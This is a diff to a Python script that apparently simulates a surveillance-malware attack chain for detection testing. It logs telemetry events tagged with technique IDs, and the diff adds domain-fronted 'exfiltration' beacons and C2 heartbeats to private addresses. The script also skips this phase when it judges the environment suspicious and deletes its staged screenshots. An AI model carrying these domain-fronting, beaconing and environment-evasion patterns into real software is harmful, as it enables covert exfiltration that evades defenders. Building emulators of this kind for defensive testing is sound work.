@@ -17,6 +17,7 @@ import sys
 from pathlib import Path
 
 from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter
+from c2_helper import fronted_beacon, emit_heartbeats, jittered_sleep, FRONT_DOMAINS
 
 
 def main() -> int:
@@ -94,21 +95,22 @@ def main() -> int:
     emit("FILE", "CREATE_FILE", str(staging), "CRITICAL",
          source_process="svchost_d.exe", detail="Harvested data staged for exfil")
 
-    # Phase 6: Exfiltration
+    # Phase 6: Exfiltration (domain-fronted)
     if env != EnvSafety.SUSPICIOUS:
         set_phase("exfiltration")
         for server in ["10.13.37.60", "10.13.37.61"]:
+            front = random.choice(FRONT_DOMAINS)
             emit("NETWORK", "EXFILTRATE", f"{server}:443", "CRITICAL",
                  source_process="svchost_d.exe", protocol="HTTPS", method="POST",
-                 detail="Exfiltrating surveillance data", technique_id="T1041")
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(2)
-                s.connect((server, 443))
-                s.close()
-            except (ConnectionRefusedError, OSError, socket.timeout):
-                pass
-            jitter(0.3, 0.4)
+                 detail=f"Exfiltrating surveillance data (fronted: {front})", technique_id="T1041")
+            emit("NETWORK", "DOMAIN_FRONT", front, "WARNING",
+                 source_process="svchost_d.exe", target_host=front, target_ip=server,
+                 detail=f"Domain fronting exfiltration via {front}", technique_id="T1090")
+            fronted_beacon(server, 443, front, {"type": "exfil", "source": "delta"})
+            jittered_sleep(0.3, 0.4)
+        emit_heartbeats("10.13.37.60", 8443, count=2,
+                        process_name="svchost_d.exe",
+                        min_interval=8.0, max_interval=20.0)
 
     shutil.rmtree(screenshots_dir, ignore_errors=True)
     emit("FILE", "DELETE_FILE", str(screenshots_dir), "INFO",
